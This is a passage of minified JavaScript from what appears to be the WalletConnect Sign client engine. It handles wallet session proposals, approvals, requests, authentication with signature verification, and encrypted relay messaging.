                const {message: nl} = Et$2("NO_MATCHING_KEY", `connect() pairing topic: ${_s}`);
                throw new Error(nl)
            }
            const Ts = await this.client.core.crypto.generateKeyPair()
              , Rs = N.wc_sessionPropose.req.ttl || cjs$3.FIVE_MINUTES
              , Ns = ii$1(Rs)
              , Hs = x(I(I({
                requiredNamespaces: st,
                optionalNamespaces: ws,
                relays: vs ?? [{
                    protocol: xt
                }],
                proposer: {
                    publicKey: Ts,
                    metadata: this.client.metadata
                },
                expiryTimestamp: Ns,
                pairingTopic: _s
            }, ms && {
                sessionProperties: ms
            }), Es && {
                scopedProperties: Es
            }), {
                id: payloadId()
            })
              , ha = ci$1("session_connect", Hs.id)
              , {reject: pa, resolve: Zs, done: Qa} = ei$1(Rs, Me)
              , Ga = ({id: nl}) => {
                nl === Hs.id && (this.client.events.off("proposal_expire", Ga),
                this.pendingSessions.delete(Hs.id),
                this.events.emit(ha, {
                    error: {
                        message: Me,
                        code: 0
                    }
                }))
            }
            ;
            return this.client.events.on("proposal_expire", Ga),
            this.events.once(ha, ({error: nl, session: sl}) => {
                this.client.events.off("proposal_expire", Ga),
                nl ? pa(nl) : sl && Zs(sl)
            }
            ),
            await this.sendRequest({
                topic: _s,
                method: "wc_sessionPropose",
                params: Hs,
                throwOnFailedPublish: !0,
                clientRpcId: Hs.id
            }),
            await this.setProposal(Hs.id, Hs),
            {
                uri: Is,
                approval: Qa
            }
        }
        ),
        c(this, "pair", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                return await this.client.core.pairing.pair(Z)
            } catch (oe) {
                throw this.client.logger.error("pair() failed"),
                oe
            }
        }
        ),
        c(this, "approve", async Z => {
            var oe, et, st;
            const ws = this.client.core.eventClient.createEvent({
                properties: {
                    topic: (oe = Z == null ? void 0 : Z.id) == null ? void 0 : oe.toString(),
                    trace: [tr.session_approve_started]
                }
            });
            try {
                this.isInitialized(),
                await this.confirmOnlineStateOrThrow()
            } catch (Bs) {
                throw ws.setError(ir.no_internet_connection),
                Bs
            }
            try {
                await this.isValidProposalId(Z == null ? void 0 : Z.id)
            } catch (Bs) {
                throw this.client.logger.error(`approve() -> proposal.get(${Z == null ? void 0 : Z.id}) failed`),
                ws.setError(ir.proposal_not_found),
                Bs
            }
            try {
                await this.isValidApprove(Z)
            } catch (Bs) {
                throw this.client.logger.error("approve() -> isValidApprove() failed"),
                ws.setError(ir.session_approve_namespace_validation_failure),
                Bs
            }
            const {id: ms, relayProtocol: Es, namespaces: vs, sessionProperties: _s, scopedProperties: Is, sessionConfig: Ss} = Z
              , Ts = this.client.proposal.get(ms);
            this.client.core.eventClient.deleteEvent({
                eventId: ws.eventId
            });
            const {pairingTopic: Rs, proposer: Ns, requiredNamespaces: Hs, optionalNamespaces: ha} = Ts;
            let pa = (et = this.client.core.eventClient) == null ? void 0 : et.getEvent({
                topic: Rs
            });
            pa || (pa = (st = this.client.core.eventClient) == null ? void 0 : st.createEvent({
                type: tr.session_approve_started,
                properties: {
                    topic: Rs,
                    trace: [tr.session_approve_started, tr.session_namespaces_validation_success]
                }
            }));
            const Zs = await this.client.core.crypto.generateKeyPair()
              , Qa = Ns.publicKey
              , Ga = await this.client.core.crypto.generateSharedKey(Zs, Qa)
              , nl = I(I(I({
                relay: {
                    protocol: Es ?? "irn"
                },
                namespaces: vs,
                controller: {
                    publicKey: Zs,
                    metadata: this.client.metadata
                },
                expiry: ii$1(X)
            }, _s && {
                sessionProperties: _s
            }), Is && {
                scopedProperties: Is
            }), Ss && {
                sessionConfig: Ss
            })
              , sl = Q.relay;
            pa.addTrace(tr.subscribing_session_topic);
            try {
                await this.client.core.relayer.subscribe(Ga, {
                    transportType: sl
                })
            } catch (Bs) {
                throw pa.setError(ir.subscribe_session_topic_failure),
                Bs
            }
            pa.addTrace(tr.subscribe_session_topic_success);
            const el = x(I({}, nl), {
                topic: Ga,
                requiredNamespaces: Hs,
                optionalNamespaces: ha,
                pairingTopic: Rs,
                acknowledged: !1,
                self: nl.controller,
                peer: {
                    publicKey: Ns.publicKey,
                    metadata: Ns.metadata
                },
                controller: Zs,
                transportType: Q.relay
            });
            await this.client.session.set(Ga, el),
            pa.addTrace(tr.store_session);
            try {
                pa.addTrace(tr.publishing_session_settle),
                await this.sendRequest({
                    topic: Ga,
                    method: "wc_sessionSettle",
                    params: nl,
                    throwOnFailedPublish: !0
                }).catch(Bs => {
                    throw pa == null || pa.setError(ir.session_settle_publish_failure),
                    Bs
                }
                ),
                pa.addTrace(tr.session_settle_publish_success),
                pa.addTrace(tr.publishing_session_approve),
                await this.sendResult({
                    id: ms,
                    topic: Rs,
                    result: {
                        relay: {
                            protocol: Es ?? "irn"
                        },
                        responderPublicKey: Zs
                    },
                    throwOnFailedPublish: !0
                }).catch(Bs => {
                    throw pa == null || pa.setError(ir.session_approve_publish_failure),
                    Bs
                }
                ),
                pa.addTrace(tr.session_approve_publish_success)
            } catch (Bs) {
                throw this.client.logger.error(Bs),
                this.client.session.delete(Ga, Kt$1("USER_DISCONNECTED")),
                await this.client.core.relayer.unsubscribe(Ga),
                Bs
            }
            return this.client.core.eventClient.deleteEvent({
                eventId: pa.eventId
            }),
            await this.client.core.pairing.updateMetadata({
                topic: Rs,
                metadata: Ns.metadata
            }),
            await this.deleteProposal(ms),
            await this.client.core.pairing.activate({
                topic: Rs
            }),
            await this.setExpiry(Ga, ii$1(X)),
            {
                topic: Ga,
                acknowledged: () => Promise.resolve(this.client.session.get(Ga))
            }
        }
        ),
        c(this, "reject", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidReject(Z)
            } catch (ws) {
                throw this.client.logger.error("reject() -> isValidReject() failed"),
                ws
            }
            const {id: oe, reason: et} = Z;
            let st;
            try {
                st = this.client.proposal.get(oe).pairingTopic
            } catch (ws) {
                throw this.client.logger.error(`reject() -> proposal.get(${oe}) failed`),
                ws
            }
            st && await this.sendError({
                id: oe,
                topic: st,
                error: et,
                rpcOpts: N.wc_sessionPropose.reject
            }),
            await this.deleteProposal(oe)
        }
        ),
        c(this, "update", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidUpdate(Z)
            } catch (Is) {
                throw this.client.logger.error("update() -> isValidUpdate() failed"),
                Is
            }
            const {topic: oe, namespaces: et} = Z
              , {done: st, resolve: ws, reject: ms} = ei$1()
              , Es = payloadId()
              , vs = getBigIntRpcId().toString()
              , _s = this.client.session.get(oe).namespaces;
            return this.events.once(ci$1("session_update", Es), ({error: Is}) => {
                Is ? ms(Is) : ws()
            }
            ),
            await this.client.session.update(oe, {
                namespaces: et
            }),
            await this.sendRequest({
                topic: oe,
                method: "wc_sessionUpdate",
                params: {
                    namespaces: et
                },
                throwOnFailedPublish: !0,
                clientRpcId: Es,
                relayRpcId: vs
            }).catch(Is => {
                this.client.logger.error(Is),
                this.client.session.update(oe, {
                    namespaces: _s
                }),
                ms(Is)
            }
            ),
            {
                acknowledged: st
            }
        }
        ),
        c(this, "extend", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidExtend(Z)
            } catch (Es) {
                throw this.client.logger.error("extend() -> isValidExtend() failed"),
                Es
            }
            const {topic: oe} = Z
              , et = payloadId()
              , {done: st, resolve: ws, reject: ms} = ei$1();
            return this.events.once(ci$1("session_extend", et), ({error: Es}) => {
                Es ? ms(Es) : ws()
            }
            ),
            await this.setExpiry(oe, ii$1(X)),
            this.sendRequest({
                topic: oe,
                method: "wc_sessionExtend",
                params: {},
                clientRpcId: et,
                throwOnFailedPublish: !0
            }).catch(Es => {
                ms(Es)
            }
            ),
            {
                acknowledged: st
            }
        }
        ),
        c(this, "request", async Z => {
            this.isInitialized();
            try {
                await this.isValidRequest(Z)
            } catch (Hs) {
                throw this.client.logger.error("request() -> isValidRequest() failed"),
                Hs
            }
            const {chainId: oe, request: et, topic: st, expiry: ws=N.wc_sessionRequest.req.ttl} = Z
              , ms = this.client.session.get(st);
            (ms == null ? void 0 : ms.transportType) === Q.relay && await this.confirmOnlineStateOrThrow();
            const Es = payloadId()
              , vs = getBigIntRpcId().toString()
              , {done: _s, resolve: Is, reject: Ss} = ei$1(ws, "Request expired. Please try again.");
            this.events.once(ci$1("session_request", Es), ({error: Hs, result: ha}) => {
                Hs ? Ss(Hs) : Is(ha)
            }
            );
            const Ts = "wc_sessionRequest"
              , Rs = this.getAppLinkIfEnabled(ms.peer.metadata, ms.transportType);
            if (Rs)
                return await this.sendRequest({
                    clientRpcId: Es,
                    relayRpcId: vs,
                    topic: st,
                    method: Ts,
                    params: {
                        request: x(I({}, et), {
                            expiryTimestamp: ii$1(ws)
                        }),
                        chainId: oe
                    },
                    expiry: ws,
                    throwOnFailedPublish: !0,
                    appLink: Rs
                }).catch(Hs => Ss(Hs)),
                this.client.events.emit("session_request_sent", {
                    topic: st,
                    request: et,
                    chainId: oe,
                    id: Es
                }),
                await _s();
            const Ns = {
                request: x(I({}, et), {
                    expiryTimestamp: ii$1(ws)
                }),
                chainId: oe
            };
            return await Promise.all([new Promise(async Hs => {
                await this.sendRequest({
                    clientRpcId: Es,
                    relayRpcId: vs,
                    topic: st,
                    method: Ts,
                    params: Ns,
                    expiry: ws,
                    throwOnFailedPublish: !0,
                    tvf: this.getTVFParams(Es, Ns)
                }).catch(ha => Ss(ha)),
                this.client.events.emit("session_request_sent", {
                    topic: st,
                    request: et,
                    chainId: oe,
                    id: Es
                }),
                Hs()
            }
            ), new Promise(async Hs => {
                var ha;
                if (!((ha = ms.sessionConfig) != null && ha.disableDeepLink)) {
                    const pa = await ui$1(this.client.core.storage, Le);
                    await ai$1({
                        id: Es,
                        topic: st,
                        wcDeepLink: pa
                    })
                }
                Hs()
            }
            ), _s()]).then(Hs => Hs[2])
        }
        ),
        c(this, "respond", async Z => {
            this.isInitialized(),
            await this.isValidRespond(Z);
            const {topic: oe, response: et} = Z
              , {id: st} = et
              , ws = this.client.session.get(oe);
            ws.transportType === Q.relay && await this.confirmOnlineStateOrThrow();
            const ms = this.getAppLinkIfEnabled(ws.peer.metadata, ws.transportType);
            isJsonRpcResult(et) ? await this.sendResult({
                id: st,
                topic: oe,
                result: et.result,
                throwOnFailedPublish: !0,
                appLink: ms
            }) : isJsonRpcError(et) && await this.sendError({
                id: st,
                topic: oe,
                error: et.error,
                appLink: ms
            }),
            this.cleanupAfterResponse(Z)
        }
        ),
        c(this, "ping", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow();
            try {
                await this.isValidPing(Z)
            } catch (et) {
                throw this.client.logger.error("ping() -> isValidPing() failed"),
                et
            }
            const {topic: oe} = Z;
            if (this.client.session.keys.includes(oe)) {
                const et = payloadId()
                  , st = getBigIntRpcId().toString()
                  , {done: ws, resolve: ms, reject: Es} = ei$1();
                this.events.once(ci$1("session_ping", et), ({error: vs}) => {
                    vs ? Es(vs) : ms()
                }
                ),
                await Promise.all([this.sendRequest({
                    topic: oe,
                    method: "wc_sessionPing",
                    params: {},
                    throwOnFailedPublish: !0,
                    clientRpcId: et,
                    relayRpcId: st
                }), ws()])
            } else
                this.client.core.pairing.pairings.keys.includes(oe) && (this.client.logger.warn("ping() on pairing topic is deprecated and will be removed in the next major release."),
                await this.client.core.pairing.ping({
                    topic: oe
                }))
        }
        ),
        c(this, "emit", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow(),
            await this.isValidEmit(Z);
            const {topic: oe, event: et, chainId: st} = Z
              , ws = getBigIntRpcId().toString()
              , ms = payloadId();
            await this.sendRequest({
                topic: oe,
                method: "wc_sessionEvent",
                params: {
                    event: et,
                    chainId: st
                },
                throwOnFailedPublish: !0,
                relayRpcId: ws,
                clientRpcId: ms
            })
        }
        ),
        c(this, "disconnect", async Z => {
            this.isInitialized(),
            await this.confirmOnlineStateOrThrow(),
            await this.isValidDisconnect(Z);
            const {topic: oe} = Z;
            if (this.client.session.keys.includes(oe))
                await this.sendRequest({
                    topic: oe,
                    method: "wc_sessionDelete",
                    params: Kt$1("USER_DISCONNECTED"),
                    throwOnFailedPublish: !0
                }),
                await this.deleteSession({
                    topic: oe,
                    emitEvent: !1
                });
            else if (this.client.core.pairing.pairings.keys.includes(oe))
                await this.client.core.pairing.disconnect({
                    topic: oe
                });
            else {
                const {message: et} = Et$2("MISMATCHED_TOPIC", `Session or pairing topic not found: ${oe}`);
                throw new Error(et)
            }
        }
        ),
        c(this, "find", Z => (this.isInitialized(),
        this.client.session.getAll().filter(oe => ya(oe, Z)))),
        c(this, "getPendingSessionRequests", () => this.client.pendingRequest.getAll()),
        c(this, "authenticate", async (Z, oe) => {
            var et;
            this.isInitialized(),
            this.isValidAuthenticate(Z);
            const st = oe && this.client.core.linkModeSupportedApps.includes(oe) && ((et = this.client.metadata.redirect) == null ? void 0 : et.linkMode)
              , ws = st ? Q.link_mode : Q.relay;
            ws === Q.relay && await this.confirmOnlineStateOrThrow();
            const {chains: ms, statement: Es="", uri: vs, domain: _s, nonce: Is, type: Ss, exp: Ts, nbf: Rs, methods: Ns=[], expiry: Hs} = Z
              , ha = [...Z.resources || []]
              , {topic: pa, uri: Zs} = await this.client.core.pairing.create({
                methods: ["wc_sessionAuthenticate"],
                transportType: ws
            });
            this.client.logger.info({
                message: "Generated new pairing",
                pairing: {
                    topic: pa,
                    uri: Zs
                }
            });
            const Qa = await this.client.core.crypto.generateKeyPair()
              , Ga = Fc(Qa);
            if (await Promise.all([this.client.auth.authKeys.set(ce, {
                responseTopic: Ga,
                publicKey: Qa
            }), this.client.auth.pairingTopics.set(Ga, {
                topic: Ga,
                pairingTopic: pa
            })]),
            await this.client.core.relayer.subscribe(Ga, {
                transportType: ws
            }),
            this.client.logger.info(`sending request to new pairing topic: ${pa}`),
            Ns.length > 0) {
                const {namespace: Ya} = Fe$1(ms[0]);
                let rl = Ef(Ya, "request", Ns);
                Oe(ha) && (rl = Bf(rl, ha.pop())),
                ha.push(rl)
            }
            const nl = Hs && Hs > N.wc_sessionAuthenticate.req.ttl ? Hs : N.wc_sessionAuthenticate.req.ttl
              , sl = {
                authPayload: {
                    type: Ss ?? "caip122",
                    chains: ms,
                    statement: Es,
                    aud: vs,
                    domain: _s,
                    version: "1",
                    nonce: Is,
                    iat: new Date().toISOString(),
                    exp: Ts,
                    nbf: Rs,
                    resources: ha
                },
                requester: {
                    publicKey: Qa,
                    metadata: this.client.metadata
                },
                expiryTimestamp: ii$1(nl)
            }
              , el = {
                eip155: {
                    chains: ms,
                    methods: [...new Set(["personal_sign", ...Ns])],
                    events: ["chainChanged", "accountsChanged"]
                }
            }
              , Bs = {
                requiredNamespaces: {},
                optionalNamespaces: el,
                relays: [{
                    protocol: "irn"
                }],
                pairingTopic: pa,
                proposer: {
                    publicKey: Qa,
                    metadata: this.client.metadata
                },
                expiryTimestamp: ii$1(N.wc_sessionPropose.req.ttl),
                id: payloadId()
            }
              , {done: Fa, resolve: Js, reject: Wa} = ei$1(nl, "Request expired")
              , Za = payloadId()
              , tl = ci$1("session_connect", Bs.id)
              , za = ci$1("session_request", Za)
              , Ws = async ({error: Ya, session: rl}) => {
                this.events.off(za, Ja),
                Ya ? Wa(Ya) : rl && Js({
                    session: rl
                })
            }
              , Ja = async Ya => {
                var rl, il, ol;
                if (await this.deletePendingAuthRequest(Za, {
                    message: "fulfilled",
                    code: 0
                }),
                Ya.error) {
                    const hl = Kt$1("WC_METHOD_UNSUPPORTED", "wc_sessionAuthenticate");
                    return Ya.error.code === hl.code ? void 0 : (this.events.off(tl, Ws),
                    Wa(Ya.error.message))
                }
                await this.deleteProposal(Bs.id),
                this.events.off(tl, Ws);
                const {cacaos: al, responder: cl} = Ya.result
                  , ll = []
                  , ul = [];
                for (const hl of al) {
                    await yf({
                        cacao: hl,
                        projectId: this.client.core.projectId
                    }) || (this.client.logger.error(hl, "Signature verification failed"),
                    Wa(Kt$1("SESSION_SETTLEMENT_FAILED", "Signature verification failed")));
                    const {p: pl} = hl
                      , gl = Oe(pl.resources)
                      , yl = [Vr$1(pl.iss)]
                      , $l = dn$1(pl.iss);
                    if (gl) {
                        const wl = If(gl)
                          , ml = Af(gl);
                        ll.push(...wl),
                        yl.push(...ml)
                    }
                    for (const wl of yl)
                        ul.push(`${wl}:${$l}`)
                }
                const dl = await this.client.core.crypto.generateSharedKey(Qa, cl.publicKey);
                let fl;
                ll.length > 0 && (fl = {
                    topic: dl,
                    acknowledged: !0,
                    self: {
                        publicKey: Qa,
                        metadata: this.client.metadata
                    },
                    peer: cl,
                    controller: cl.publicKey,
                    expiry: ii$1(X),
                    requiredNamespaces: {},
                    optionalNamespaces: {},
                    relay: {
                        protocol: "irn"
                    },
                    pairingTopic: pa,
                    namespaces: ga([...new Set(ll)], [...new Set(ul)]),
                    transportType: ws
                },
                await this.client.core.relayer.subscribe(dl, {
                    transportType: ws
                }),
                await this.client.session.set(dl, fl),
                pa && await this.client.core.pairing.updateMetadata({
                    topic: pa,
                    metadata: cl.metadata
                }),
                fl = this.client.session.get(dl)),
                (rl = this.client.metadata.redirect) != null && rl.linkMode && (il = cl.metadata.redirect) != null && il.linkMode && (ol = cl.metadata.redirect) != null && ol.universal && oe && (this.client.core.addLinkModeSupportedApp(cl.metadata.redirect.universal),
                this.client.session.update(dl, {
                    transportType: Q.link_mode
                })),
                Js({
                    auths: al,
                    session: fl
                })
            }
            ;
            this.events.once(tl, Ws),
            this.events.once(za, Ja);
            let Xa;
            try {
                if (st) {
                    const Ya = formatJsonRpcRequest("wc_sessionAuthenticate", sl, Za);
                    this.client.core.history.set(pa, Ya);
                    const rl = await this.client.core.crypto.encode("", Ya, {
                        type: ge$1,
                        encoding: De$1
                    });
                    Xa = sa(oe, pa, rl)
                } else
                    await Promise.all([this.sendRequest({
                        topic: pa,
                        method: "wc_sessionAuthenticate",
                        params: sl,
                        expiry: Z.expiry,
                        throwOnFailedPublish: !0,
                        clientRpcId: Za
                    }), this.sendRequest({
                        topic: pa,
                        method: "wc_sessionPropose",
                        params: Bs,
                        expiry: N.wc_sessionPropose.req.ttl,
                        throwOnFailedPublish: !0,
                        clientRpcId: Bs.id
                    })])
            } catch (Ya) {
                throw this.events.off(tl, Ws),
                this.events.off(za, Ja),
                Ya
            }
            return await this.setProposal(Bs.id, Bs),
            await this.setAuthRequest(Za, {
                request: x(I({}, sl), {
                    verifyContext: {}
                }),
                pairingTopic: pa,
                transportType: ws
            }),
            {
                uri: Xa ?? Zs,
                response: Fa
            }
        }
        ),
        c(this, "approveSessionAuthenticate", async Z => {
            const {id: oe, auths: et} = Z
              , st = this.client.core.eventClient.createEvent({
                properties: {
                    topic: oe.toString(),
                    trace: [sr.authenticated_session_approve_started]
                }
            });
            try {
                this.isInitialized()
            } catch (Hs) {
                throw st.setError(rr.no_internet_connection),
                Hs
            }
            const ws = this.getPendingAuthRequest(oe);
            if (!ws)
                throw st.setError(rr.authenticated_session_pending_request_not_found),
                new Error(`Could not find pending auth request with id ${oe}`);
            const ms = ws.transportType || Q.relay;
            ms === Q.relay && await this.confirmOnlineStateOrThrow();
            const Es = ws.requester.publicKey
              , vs = await this.client.core.crypto.generateKeyPair()
              , _s = Fc(Es)
              , Is = {
                type: ee,
                receiverPublicKey: Es,
                senderPublicKey: vs
            }
              , Ss = []
              , Ts = [];
            for (const Hs of et) {
                if (!await yf({
                    cacao: Hs,
                    projectId: this.client.core.projectId
                })) {
                    st.setError(rr.invalid_cacao);
                    const Ga = Kt$1("SESSION_SETTLEMENT_FAILED", "Signature verification failed");
                    throw await this.sendError({
                        id: oe,
                        topic: _s,
                        error: Ga,
                        encodeOpts: Is
                    }),
                    new Error(Ga.message)
                }
                st.addTrace(sr.cacaos_verified);
                const {p: ha} = Hs
                  , pa = Oe(ha.resources)
                  , Zs = [Vr$1(ha.iss)]
                  , Qa = dn$1(ha.iss);
                if (pa) {
                    const Ga = If(pa)
                      , nl = Af(pa);
                    Ss.push(...Ga),
                    Zs.push(...nl)
                }
                for (const Ga of Zs)
                    Ts.push(`${Ga}:${Qa}`)
            }
            const Rs = await this.client.core.crypto.generateSharedKey(vs, Es);
            st.addTrace(sr.create_authenticated_session_topic);
            let Ns;
            if ((Ss == null ? void 0 : Ss.length) > 0) {
                Ns = {
                    topic: Rs,
                    acknowledged: !0,
                    self: {
                        publicKey: vs,
                        metadata: this.client.metadata
                    },
                    peer: {
                        publicKey: Es,
                        metadata: ws.requester.metadata
                    },
                    controller: Es,
                    expiry: ii$1(X),
                    authentication: et,
                    requiredNamespaces: {},
                    optionalNamespaces: {},
                    relay: {
                        protocol: "irn"
                    },
                    pairingTopic: ws.pairingTopic,
                    namespaces: ga([...new Set(Ss)], [...new Set(Ts)]),
                    transportType: ms
                },
                st.addTrace(sr.subscribing_authenticated_session_topic);
                try {
                    await this.client.core.relayer.subscribe(Rs, {
                        transportType: ms
                    })
                } catch (Hs) {
                    throw st.setError(rr.subscribe_authenticated_session_topic_failure),
                    Hs
                }
                st.addTrace(sr.subscribe_authenticated_session_topic_success),
                await this.client.session.set(Rs, Ns),
                st.addTrace(sr.store_authenticated_session),
                await this.client.core.pairing.updateMetadata({
                    topic: ws.pairingTopic,
                    metadata: ws.requester.metadata
                })
            }
            st.addTrace(sr.publishing_authenticated_session_approve);
            try {
                await this.sendResult({
                    topic: _s,
                    id: oe,
                    result: {
                        cacaos: et,
                        responder: {
                            publicKey: vs,
                            metadata: this.client.metadata
                        }
                    },
                    encodeOpts: Is,
                    throwOnFailedPublish: !0,
                    appLink: this.getAppLinkIfEnabled(ws.requester.metadata, ms)
                })
            } catch (Hs) {
                throw st.setError(rr.authenticated_session_approve_publish_failure),
                Hs
            }
            return await this.client.auth.requests.delete(oe, {
                message: "fulfilled",
                code: 0
            }),
            await this.client.core.pairing.activate({
                topic: ws.pairingTopic
            }),
            this.client.core.eventClient.deleteEvent({
                eventId: st.eventId
            }),
            {
                session: Ns
            }
        }
        ),
        c(this, "rejectSessionAuthenticate", async Z => {
            this.isInitialized();
            const {id: oe, reason: et} = Z
              , st = this.getPendingAuthRequest(oe);
            if (!st)
                throw new Error(`Could not find pending auth request with id ${oe}`);
            st.transportType === Q.relay && await this.confirmOnlineStateOrThrow();
            const ws = st.requester.publicKey
              , ms = await this.client.core.crypto.generateKeyPair()
              , Es = Fc(ws)
              , vs = {
                type: ee,
                receiverPublicKey: ws,
                senderPublicKey: ms
            };
            await this.sendError({
                id: oe,
                topic: Es,
                error: et,
                encodeOpts: vs,
                rpcOpts: N.wc_sessionAuthenticate.reject,
                appLink: this.getAppLinkIfEnabled(st.requester.metadata, st.transportType)
            }),
            await this.client.auth.requests.delete(oe, {
                message: "rejected",
                code: 0
            }),
            await this.deleteProposal(oe)
        }
        ),
        c(this, "formatAuthMessage", Z => {
            this.isInitialized();
            const {request: oe, iss: et} = Z;
            return qr$1(oe, et)
        }
        ),
        c(this, "processRelayMessageCache", () => {
            setTimeout(async () => {
                if (this.relayMessageCache.length !== 0)
                    for (; this.relayMessageCache.length > 0; )
                        try {
                            const Z = this.relayMessageCache.shift();
                            Z && await this.onRelayMessage(Z)
                        } catch (Z) {
                            this.client.logger.error(Z)
                        }
            }
            , 50)
        }
        ),
        c(this, "cleanupDuplicatePairings", async Z => {
            if (Z.pairingTopic)
                try {
                    const oe = this.client.core.pairing.pairings.get(Z.pairingTopic)
                      , et = this.client.core.pairing.pairings.getAll().filter(st => {
                        var ws, ms;
                        return ((ws = st.peerMetadata) == null ? void 0 : ws.url) && ((ms = st.peerMetadata) == null ? void 0 : ms.url) === Z.peer.metadata.url && st.topic && st.topic !== oe.topic
                    }
                    );
                    if (et.length === 0)
                        return;
                    this.client.logger.info(`Cleaning up ${et.length} duplicate pairing(s)`),
                    await Promise.all(et.map(st => this.client.core.pairing.disconnect({
                        topic: st.topic
                    }))),
                    this.client.logger.info("Duplicate pairings clean up finished")
                } catch (oe) {
                    this.client.logger.error(oe)
                }
        }
        ),
        c(this, "deleteSession", async Z => {
            var oe;
            const {topic: et, expirerHasDeleted: st=!1, emitEvent: ws=!0, id: ms=0} = Z
              , {self: Es} = this.client.session.get(et);
            await this.client.core.relayer.unsubscribe(et),
            await this.client.session.delete(et, Kt$1("USER_DISCONNECTED")),
            this.addToRecentlyDeleted(et, "session"),
            this.client.core.crypto.keychain.has(Es.publicKey) && await this.client.core.crypto.deleteKeyPair(Es.publicKey),
            this.client.core.crypto.keychain.has(et) && await this.client.core.crypto.deleteSymKey(et),
            st || this.client.core.expirer.del(et),
            this.client.core.storage.removeItem(Le).catch(vs => this.client.logger.warn(vs)),
            this.getPendingSessionRequests().forEach(vs => {
                vs.topic === et && this.deletePendingSessionRequest(vs.id, Kt$1("USER_DISCONNECTED"))
            }
            ),
            et === ((oe = this.sessionRequestQueue.queue[0]) == null ? void 0 : oe.topic) && (this.sessionRequestQueue.state = $.idle),
            ws && this.client.events.emit("session_delete", {
                id: ms,
                topic: et
            })
        }
        ),
        c(this, "deleteProposal", async (Z, oe) => {
            if (oe)
                try {
                    const et = this.client.proposal.get(Z)
                      , st = this.client.core.eventClient.getEvent({
                        topic: et.pairingTopic
                    });
                    st == null || st.setError(ir.proposal_expired)
                } catch {}
            await Promise.all([this.client.proposal.delete(Z, Kt$1("USER_DISCONNECTED")), oe ? Promise.resolve() : this.client.core.expirer.del(Z)]),
            this.addToRecentlyDeleted(Z, "proposal")
        }
        ),
        c(this, "deletePendingSessionRequest", async (Z, oe, et=!1) => {
            await Promise.all([this.client.pendingRequest.delete(Z, oe), et ? Promise.resolve() : this.client.core.expirer.del(Z)]),
            this.addToRecentlyDeleted(Z, "request"),
            this.sessionRequestQueue.queue = this.sessionRequestQueue.queue.filter(st => st.id !== Z),
            et && (this.sessionRequestQueue.state = $.idle,
            this.client.events.emit("session_request_expire", {
                id: Z
            }))
        }
        ),
        c(this, "deletePendingAuthRequest", async (Z, oe, et=!1) => {
            await Promise.all([this.client.auth.requests.delete(Z, oe), et ? Promise.resolve() : this.client.core.expirer.del(Z)])
        }
        ),
        c(this, "setExpiry", async (Z, oe) => {
            this.client.session.keys.includes(Z) && (this.client.core.expirer.set(Z, oe),
            await this.client.session.update(Z, {
                expiry: oe
            }))
        }
        ),
        c(this, "setProposal", async (Z, oe) => {
            this.client.core.expirer.set(Z, ii$1(N.wc_sessionPropose.req.ttl)),
            await this.client.proposal.set(Z, oe)
        }
        ),
        c(this, "setAuthRequest", async (Z, oe) => {
            const {request: et, pairingTopic: st, transportType: ws=Q.relay} = oe;
            this.client.core.expirer.set(Z, et.expiryTimestamp),
            await this.client.auth.requests.set(Z, {
                authPayload: et.authPayload,
                requester: et.requester,
                expiryTimestamp: et.expiryTimestamp,
                id: Z,
                pairingTopic: st,
                verifyContext: et.verifyContext,
                transportType: ws
            })
        }
        ),
        c(this, "setPendingSessionRequest", async Z => {
            const {id: oe, topic: et, params: st, verifyContext: ws} = Z
              , ms = st.request.expiryTimestamp || ii$1(N.wc_sessionRequest.req.ttl);
            this.client.core.expirer.set(oe, ms),
            await this.client.pendingRequest.set(oe, {
                id: oe,
                topic: et,
                params: st,
                verifyContext: ws
            })
        }
        ),
        c(this, "sendRequest", async Z => {
            const {topic: oe, method: et, params: st, expiry: ws, relayRpcId: ms, clientRpcId: Es, throwOnFailedPublish: vs, appLink: _s, tvf: Is} = Z
              , Ss = formatJsonRpcRequest(et, st, Es);
            let Ts;
            const Rs = !!_s;
            try {
                const ha = Rs ? De$1 : Qt$1;
                Ts = await this.client.core.crypto.encode(oe, Ss, {
                    encoding: ha
                })
            } catch (ha) {
                throw await this.cleanup(),
                this.client.logger.error(`sendRequest() -> core.crypto.encode() for topic ${oe} failed`),
                ha
            }
            let Ns;
            if (mt.includes(et)) {
                const ha = zc(JSON.stringify(Ss))
                  , pa = zc(Ts);
                Ns = await this.client.core.verify.register({
                    id: pa,
                    decryptedId: ha
                })
            }
            const Hs = N[et].req;
            if (Hs.attestation = Ns,
            ws && (Hs.ttl = ws),
            ms && (Hs.id = ms),
            this.client.core.history.set(oe, Ss),
            Rs) {
                const ha = sa(_s, oe, Ts);
                await window.Linking.openURL(ha, this.client.name)
            } else {
                const ha = N[et].req;
                ws && (ha.ttl = ws),
                ms && (ha.id = ms),
                ha.tvf = x(I({}, Is), {
                    correlationId: Ss.id
                }),
                vs ? (ha.internal = x(I({}, ha.internal), {
                    throwOnFailedPublish: !0
                }),
                await this.client.core.relayer.publish(oe, Ts, ha)) : this.client.core.relayer.publish(oe, Ts, ha).catch(pa => this.client.logger.error(pa))
            }
            return Ss.id
        }
        ),
        c(this, "sendResult", async Z => {
            const {id: oe, topic: et, result: st, throwOnFailedPublish: ws, encodeOpts: ms, appLink: Es} = Z
              , vs = formatJsonRpcResult(oe, st);
            let _s;
            const Is = Es && typeof (window == null ? void 0 : window.Linking) < "u";
            try {
                const Rs = Is ? De$1 : Qt$1;
                _s = await this.client.core.crypto.encode(et, vs, x(I({}, ms || {}), {
                    encoding: Rs
                }))
            } catch (Rs) {
                throw await this.cleanup(),
                this.client.logger.error(`sendResult() -> core.crypto.encode() for topic ${et} failed`),
                Rs
            }
            let Ss, Ts;
            try {
                Ss = await this.client.core.history.get(et, oe);
                const Rs = Ss.request;
                try {
                    Ts = this.getTVFParams(oe, Rs.params, st)
                } catch (Ns) {
                    this.client.logger.warn(`sendResult() -> getTVFParams() failed: ${Ns == null ? void 0 : Ns.message}`)
                }
            } catch (Rs) {
                throw this.client.logger.error(`sendResult() -> history.get(${et}, ${oe}) failed`),
                Rs
            }
            if (Is) {
                const Rs = sa(Es, et, _s);
                await window.Linking.openURL(Rs, this.client.name)
            } else {
                const Rs = Ss.request.method
                  , Ns = N[Rs].res;
